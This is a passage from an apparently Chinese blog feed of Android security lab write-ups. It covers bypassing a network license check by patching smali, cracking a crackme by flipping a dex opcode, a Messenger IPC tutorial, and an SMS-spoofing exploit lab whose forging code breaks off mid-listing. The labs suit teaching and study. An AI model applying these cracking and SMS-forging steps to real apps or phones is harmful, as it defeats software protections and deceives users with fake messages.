    <content type="html"><![CDATA[<h2 id="使用网络抓包进行网络验证破解"><a href="#使用网络抓包进行网络验证破解" class="headerlink" title="使用网络抓包进行网络验证破解"></a>使用网络抓包进行网络验证破解</h2><p>目的：</p><ul><li>学会使用网络抓包方式分析网络验证方法，破解验证机制</li></ul><p>原理：</p><ul><li>网络验证是指软件运行时与互联网进行一些认证。通过向服务器发送请求反馈信息，对于静态的信息，分析人员能够手动获取信息的所有内容，破解时相对简单，只需在验证点补丁上相应信息即可。</li></ul><p>过程：</p><p>将network安装到模拟器运行并点击按钮<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229135933543.png" alt="image-20211229135933543"></p><p>联网后点击执行功能按钮</p><p>抓包的过程需要在联网环境下才能完成，另外因原网址失效，抓不到演示程序的通信数据包，可直接使用抓取的数据包C:\AndroidSec\SimpleEdu46\capture.pcap进行分析。</p><p>在实验目录AndroidSec\SimpleEdu46下进入adb shell 运行命令“mount -o remount rw /”后输入exit退出。<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229140059286.png" alt="image-20211229140059286"></p><p>将tcpdump push到sdcard 上，执行“adb push tcpdump /sdcard/tcpdump”。<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229140147104.png" alt="image-20211229140147104"></p><p>进入adb shell，对tcpdump进行提权，执行“adb shell chmod 777 /sdcard/ tcpdump”（此处一定要对tcpdump进行提权否则会出现readonly权限不够的情况）。<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229140302748.png" alt="image-20211229140302748"></p><p>执行命令开始抓包，执行“adb shell tcpdump -p -vv -s 0 -w /sdcard/capture.pcap”<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229140408451.png" alt="image-20211229140408451"></p><p>回到程序界面，点击执行功能按钮</p><p>回到命令窗按下CTRL+C停止抓包<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229140516685.png" alt="image-20211229140516685"></p><p>执行adb pull /sdcard/capture.pcap命令，将抓到的数据包导出。<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229141451091.png" alt="image-20211229141451091"></p><p>导出的文件会放在当前文件夹里。<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229141725491.png" alt="image-20211229141725491"></p><p>在开始菜单—&gt;所有程序里找到wirkshark，用wireshark打开抓包文件（注：这里可以用提供的数据包查看之前抓到的数据）。<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229142443458.png" alt="image-20211229142443458"></p><p>在搜索栏里输入http并按回车键查看相关的数据<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229144232643.png" alt="image-20211229144232643"></p><p>点击GET请求右键追踪TCP流<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229144309999.png" alt="image-20211229144309999"></p><p>发现请求内容是固定的</p><p>反编译network.apk。将network.apk放到apktool所在的文件夹，命令行定位到该文件夹并运行apktool d [-s] -f C:\AndroidSec\SimpleEdu46\apktool\network.apk -o C:\AndroidSec\SimpleEdu46\apktool\out<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229144812626.png" alt="image-20211229144812626"></p><p>打开C:\AndroidSec\SimpleEdu46\apktool\out\smali\com\droider\network文件夹中的Mainactivity$1.smali文件，用editplus打开，搜索onClick()方法<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229144927017.png" alt="image-20211229144927017"></p><p>找到access$2方法，仅保留access$​2方法的调用并删除param p1,”v”，修改后的代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># virtual methods</span><br><span class="line"></span><br><span class="line">.<span class="function">method <span class="keyword">public</span> <span class="title">onClick</span><span class="params">(Landroid/view/View;)</span>V</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">.locals 1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">.prologue</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">:cond_0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">iget-object v0, p0, Lcom/droider/network/MainActivity$1</span>;-&gt;<span class="keyword">this</span>$<span class="number">0</span>:Lcom/droider/network/MainActivity;</span><br><span class="line"></span><br><span class="line"># invokes: Lcom/droider/network/MainActivity;-&gt;getData()V</span><br><span class="line"></span><br><span class="line">invoke-<span class="keyword">static</span> &#123;v0&#125;, Lcom/droider/network/MainActivity;-&gt;access$<span class="number">2</span>(Lcom/droider/network/MainActivity;)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>-<span class="keyword">void</span></span><br><span class="line"></span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><p>打开MainActivity.smali文件找到getData()方法。删除HttpUtils类里面的getStringFromURL()的调用<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229150309607.png" alt="image-20211229150309607"></p><p>将之前分析的返回的字符串，赋值给v1寄存器，这样就与和网络上获取的数据是一样的，按如下所示修改代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const-string v1, &quot;&#123;\r\n\t\&quot;info\&quot;:&#123;\r\n\t\t\&quot;key\&quot;:\&quot;droider\&quot;,\r\n\t\t\&quot;msg\&quot;:\&quot;2970C000324690E4AC28850CC2E4D36C6713FE28F48BD03D442AE1845CBDF16EA68CEDB67F8E90C6D47BB4C7F492322056C4A6B56BA1633BDCF9715850E77B18\&quot;\r\n\t&#125;\r\n&#125;\r\n&quot;</span><br></pre></td></tr></table></figure><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229151529488.png" alt="image-20211229151529488"></p><p>打开apktool文件夹，在命令行执行 java -jar apktool.jar b -d out -o debug.apk,生成apk文件<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229151927718.png" alt="image-20211229151927718"></p><p>将生成的apk拷贝到C:\AndroidSec\SimpleEdu46\SignAPK中对生成apk进行重签名<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229152108448.png" alt="image-20211229152108448"></p><p>安装运行。发现此时已经绕过网络验证（点击执行功能，不再出现获取网络数据出错）<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229152528719.png" alt="image-20211229152528719"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;使用网络抓包进行网络验证破解&quot;&gt;&lt;a href=&quot;#使用网络抓包进行网络验证破解&quot; class=&quot;headerlink&quot; title=&quot;使用网络抓包进行网络验证破解&quot;&gt;&lt;/a&gt;使用网络抓包进行网络验证破解&lt;/h2&gt;&lt;p&gt;目的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;学会使用网</summary>
      
    
    
    
    
    <category term="抓包" scheme="https://0xchang.github.io/tags/%E6%8A%93%E5%8C%85/"/>
    
    <category term="破解" scheme="https://0xchang.github.io/tags/%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>APK静态分析</title>
    <link href="https://0xchang.github.io/2021/12/28/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"/>
    <id>https://0xchang.github.io/2021/12/28/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/</id>
    <published>2021-12-28T00:22:15.000Z</published>
    <updated>2022-02-11T11:59:47.210Z</updated>
    
    <content type="html"><![CDATA[<h2 id="APK静态分析"><a href="#APK静态分析" class="headerlink" title="APK静态分析"></a>APK静态分析</h2><p>目的：</p><ul><li>了解APK（DEX）静态分析的基本步骤</li><li>掌握使用IDApro辅助进行静态分析的方法</li></ul><p>原理：</p><ul><li>程序静态分析（Program Static Analysis）是指在不运行代码的方式下，通过词法分析、语法分析、控制流、数据流分析等技术对程序代码进行扫描，验证代码是否满足规范性、安全性、可靠性、可维护性等指标的一种代码分析技术。目前静态分析技术向模拟执行的技术发展以能够发现更多传统意义上动态测试才能发现的缺陷，例如符号执行、抽象解释、值依赖分析等等并采用数学约束求解工具进行路径约减或者可达性分析以减少误报增加效率。</li><li>Smali，Baksmali分别是指安卓系统里的Java虚拟机（Dalvik）所使用的一种.dex格式文件的汇编器，反汇编器。</li></ul><p>过程：</p><p>使用解压软件打开crackme0502.apk,解压出classes.dex，打开IDApro并将classes.dex拖入到IDA中<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105021723.png" alt="image-20211229105021723"></p><p>导入结构化文件，点击file-script file，然后选择dex.idc文件，确定<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105052129.png" alt="image-20211229105052129"></p><p>按ALT+Q，可以看到DEX文件的结构，选择某一项点击确定，可以跳到相应字段的起始位置<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105232030.png" alt="image-20211229105232030"></p><p>打开eclipse，启动SimpleEdu45虚拟机，并在SimpleEdu45目录下运行命令adb install crackme0502.apk<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105658041.png" alt="image-20211229105658041"></p><p>打开crackeme0502，点击“获取注解”按钮<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105844377.png" alt="image-20211229105844377"></p><p>打开crackme0502，点击“检测注册码”按钮<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105858622.png" alt="image-20211229105858622"></p><p>切换回IDA pro，切换至Exports选项卡。程序运行的主Activity一般叫MainActivity，所以按住ctrl+f，键入Main，可以发现MainActivity中有两个内部类都有OnClick()方法。<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110001643.png" alt="image-20211229110001643"></p><p>分别双击MainActivity$1.onClick@VL和MainActivity$2.onClick@VL来查看对应的方法实现，通过对比，可以发现后者的方法创建了名为SNChecker的一个对象，故序列号检查功能应该在MainActivity$​2.onClick@VL中。</p><p>MainActivity$1.onClick@VL <img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110055781.png" alt="image-20211229110055781"></p><p>MainActivity$2.onClick@VL <img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110114049.png" alt="image-20211229110114049"></p><p>按空格键将IDA切换至“流程视图”<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110629336.png" alt="image-20211229110629336"></p><p>很明显可以看出，红色的线是不满足条件所跳转到的语句，绿色的是满足条件时的跳转。所以把if-eqz换成if-nez就有可能破解成功。故将光标定位值if-eqz一行<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110655907.png" alt="image-20211229110655907"></p><p>然后切换至HEX-view 1选项卡<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110748059.png" alt="image-20211229110748059"></p><p>关闭IDA，右键使用UltraEdit工具打开classes.dex，按CTRL+F搜索38020F00（有多个38020F00，注意起始地址是否为002D0B0，如下图所示）。由于if-nez的Opcode为39，故将38改为39，然后保存该文件（点击右上角切为16进制显示模式）<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111128616.png" alt="image-20211229111128616"></p><p>ctrl+f寻找,将38改为39</p><p>运行DexFixer.exe，将保存好的DEX文件拖进窗口中，进行Header的Checksum修复<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111244001.png" alt="image-20211229111244001"></p><p>把classes.dex重新添加至apk文件（使用360压缩打开apk文件将class.dex替换即可），并运行命令signapk crackme0502.apk重新签名<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111424498.png" alt="image-20211229111424498"></p><p>并把生成的signed.apk按着之前的方法重新安装至虚拟机中（需要先将之前安装的程序卸载）adb install signed.apk。注意是signed.apk。再次点击下面的按钮，发现软件提示已注册。</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111717277.png" alt="image-20211229111717277"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;APK静态分析&quot;&gt;&lt;a href=&quot;#APK静态分析&quot; class=&quot;headerlink&quot; title=&quot;APK静态分析&quot;&gt;&lt;/a&gt;APK静态分析&lt;/h2&gt;&lt;p&gt;目的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;了解APK（DEX）静态分析的基本步骤&lt;/li&gt;
&lt;li&gt;掌握使用</summary>
      
    
    
    
    
    <category term="APK" scheme="https://0xchang.github.io/tags/APK/"/>
    
    <category term="逆向" scheme="https://0xchang.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="IDA" scheme="https://0xchang.github.io/tags/IDA/"/>
    
  </entry>
  
  <entry>
    <title>进程间Messenger通信</title>
    <link href="https://0xchang.github.io/2021/12/27/%E8%BF%9B%E7%A8%8B%E9%97%B4Messenger%E9%80%9A%E4%BF%A1/"/>
    <id>https://0xchang.github.io/2021/12/27/%E8%BF%9B%E7%A8%8B%E9%97%B4Messenger%E9%80%9A%E4%BF%A1/</id>
    <published>2021-12-27T13:49:40.000Z</published>
    <updated>2022-02-11T11:59:50.592Z</updated>
    
    <content type="html"><![CDATA[<h2 id="进程间Messenger通信"><a href="#进程间Messenger通信" class="headerlink" title="进程间Messenger通信"></a>进程间Messenger通信</h2><p>目的：</p><ul><li>通过JAVA编程理解Android进程通信</li></ul><p>原理：</p><ul><li>Android程序中的进程间数据传递的问题到许多机制，比如aidl, Messenger, 以及Intent, ContentProvider以及底层的binder。Messenger是Android提供的一个工具类。使用Messenger可以避免编写AIDL文件来进行进程间通信，简化进程间通信的功能。Messenger，信使，其指向一个Handler，他人可以使用信使向Handler发送消息。信使实现了基于消息队列的跨进程的通讯，在一个进程中 创建一个指向Handler的信使，然后把信使返回给其他的进程，使得其它的进程可以向这个进程发送消息。在Messenger内部有一个 IMessenger接口指针，其在Messenger的构造函数中指向了一个Handler中的IMessenger，这样就保存了一个指向 Handler的指针。</li><li>基本原理：服务端的Messenger需要在onBind方法中返回IBinder实例：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> IBinder <span class="title">onBind</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> messenger.getBinder();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>客户端则需要在如下代码中创建与之关联的客户端Messenger：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onServiceConnected</span><span class="params">(ComponentName name, IBinder service)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 得到了一个binder作为桥梁，创建客户端的信使</span></span><br><span class="line">    messenger = <span class="keyword">new</span> Messenger(service);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><ul><li>两边的信使通过IBinder实例关联起来后，就可以通过send方法来互相发送消息了。 如果需要回调，则将另一个Messenger放到Message的replayTo属性中发送给另一端，由另一端来执行回调函数。</li></ul><p>过程：</p><p>打开eclipse，点击file-import，弹出import窗口</p><p>选择android下的existing android code into workspace<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E8%BF%9B%E7%A8%8B%E9%97%B4Messenger%E9%80%9A%E4%BF%A1/image-20211229103119506.png" alt="image-20211229103119506"></p><p>点击next，弹出导入窗口，接着点击browse，选择simpleedu31<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E8%BF%9B%E7%A8%8B%E9%97%B4Messenger%E9%80%9A%E4%BF%A1/image-20211229103215577.png" alt="image-20211229103215577"></p><p>点击finish导入</p><p>打开avd虚拟机simpleedu31，右键项目，选择run as-android application<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E8%BF%9B%E7%A8%8B%E9%97%B4Messenger%E9%80%9A%E4%BF%A1/image-20211229103526330.png" alt="image-20211229103526330"></p><p>程序运行<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E8%BF%9B%E7%A8%8B%E9%97%B4Messenger%E9%80%9A%E4%BF%A1/image-20211229104428625.png" alt="image-20211229104428625"></p><p>点击bind,启动messengerservice<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E8%BF%9B%E7%A8%8B%E9%97%B4Messenger%E9%80%9A%E4%BF%A1/image-20211229104450082.png" alt="image-20211229104450082"></p><p>点击message向MessengerService发送消息，messengerservice收到消息后弹出显示框<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E8%BF%9B%E7%A8%8B%E9%97%B4Messenger%E9%80%9A%E4%BF%A1/image-20211229104520678.png" alt="image-20211229104520678"></p><p>点击callback，messengerservice收到消息后会构造一个信息返回给mainactivity<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E8%BF%9B%E7%A8%8B%E9%97%B4Messenger%E9%80%9A%E4%BF%A1/image-20211229104539221.png" alt="image-20211229104539221"></p><p>点击unbind停止messengerservice服务，messengerservice服务停止之后点击message，callback，均不会有反应</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;进程间Messenger通信&quot;&gt;&lt;a href=&quot;#进程间Messenger通信&quot; class=&quot;headerlink&quot; title=&quot;进程间Messenger通信&quot;&gt;&lt;/a&gt;进程间Messenger通信&lt;/h2&gt;&lt;p&gt;目的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过JAV</summary>
      
    
    
    
    
    <category term="进程" scheme="https://0xchang.github.io/tags/%E8%BF%9B%E7%A8%8B/"/>
    
    <category term="Messenger" scheme="https://0xchang.github.io/tags/Messenger/"/>
    
  </entry>
  
  <entry>
    <title>Android安全之短信欺诈漏洞</title>
    <link href="https://0xchang.github.io/2021/12/27/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/"/>
    <id>https://0xchang.github.io/2021/12/27/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-12-27T11:46:16.000Z</published>
    <updated>2022-02-11T11:59:47.151Z</updated>
    
    <content type="html"><![CDATA[<p>目的：</p><ul><li>通过JAVA编程理解Android手机安全漏洞的基本原理</li><li>用JAVA编写伪造短信代码，向系统收件箱发送伪造短信</li></ul><p>原理：</p><ul><li>漏洞原理介绍</li><li>该系统漏洞能够使攻击者无需申请任何权限发送短信到用户收件箱。 出现该漏洞的原因是Android系统的com.android.mms.transaction。</li><li>SmsReceiverService系统服务未判断启动服务的调用者，攻击者可以通过该应用发送伪装短信到用户收件箱。本漏洞实质上是一种能力的泄漏。</li><li>漏洞发送的短信并不经过GSM网络,所以即使手机没有插sim卡,也照样可以收到短信,这让大部分的短信防火墙完全失效。</li></ul><p>过程：</p><p>打开eclipse，点击file-import，选择android目录下的existing android code into workspace<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100046569.png" alt="image-20211229100046569"></p><p>选择simpleedu28项目<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100118574.png" alt="image-20211229100118574"></p><p>导入后的项目<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100200697.png" alt="image-20211229100200697"></p><p>在工程目录res/layout的界面代码，这里可以通过控制代码，编辑相应的函数生成欺诈短信，点击activity_main.xml，可以看到界面布局的文件<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100257165.png" alt="image-20211229100257165"></p><p>在mainactivity中添加运行欺诈短信的代码，点开<code>msgdemo2\src\com.example.msgdemol\mainactivity.java</code><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100406295.png" alt="image-20211229100406295"></p><p>在mainactivity的init()函数添加如下代码，为button设置监听事件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//为发送按钮设置监听</span></span><br><span class="line">sendBt.setOnClickListener(<span class="keyword">new</span> OnClickListener()&#123;</span><br><span class="line">       <span class="meta">@Override</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">                       <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 *获取输入的伪造号码和内</span></span><br><span class="line"><span class="comment">                 *判断输入是否合法</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">String num=msgNumTv.getText().toString();</span><br><span class="line">String con=msgConTv.getText().toString();</span><br><span class="line">If(num.length()&lt;<span class="number">1</span>||con.length()&lt;<span class="number">1</span>)</span><br><span class="line">&#123; Toast.makeText(MainActivity.<span class="keyword">this</span>,”电话号码或者内容没有输入”,Toast.LENGTH_SHORT).show();</span><br><span class="line"><span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="comment">//判断通过伪造短信</span></span><br><span class="line"><span class="comment">//make Msg(MainActivity.this,num,con);</span></span><br><span class="line">createFakeMsg(MainActivity.<span class="keyword">this</span>,num,con);&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在MainActivity的init()函数,跳转到init函数位置添加上一步的代码</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229101856123.png" alt="image-20211229101856123">createFakeMsg的具体代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 